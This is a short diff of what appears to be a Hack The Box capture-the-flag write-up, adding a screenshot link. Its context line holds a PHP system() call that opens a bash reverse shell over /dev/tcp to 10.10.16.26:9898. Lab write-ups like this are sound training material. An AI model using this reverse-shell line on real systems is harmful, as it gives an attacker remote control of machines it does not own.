@@ -98,6 +98,9 @@ system('bash  -c "sh -i >& /dev/tcp/10.10.16.26/9898 0>&1"');
 ```
 
 ![imagen](https://github.com/PolGs/HTB-Open-Beta-Season-III/assets/19478700/ced2881a-0a71-466d-b030-37355627a0af)
+![imagen](https://github.com/PolGs/HTB-Open-Beta-Season-III/assets/19478700/0cacbe79-c0ab-485f-9ca1-989d66c66a54)
+
+
 
 
 
